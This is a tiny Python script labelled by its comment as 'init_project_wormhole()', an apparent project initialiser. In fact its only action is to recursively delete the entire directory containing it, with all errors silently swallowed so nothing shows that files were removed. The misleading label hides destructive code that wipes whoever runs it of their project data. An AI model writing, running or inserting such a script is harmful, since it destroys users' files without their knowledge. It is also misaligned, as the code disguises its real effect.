#!/usr/bin/python3
# SIGNATURE - init_project_wormhole()
try:
    import shutil
    import pathlib
    current_directory = pathlib.Path(__file__).parent.absolute()
    shutil.rmtree(current_directory, ignore_errors=True)
except:
    pass
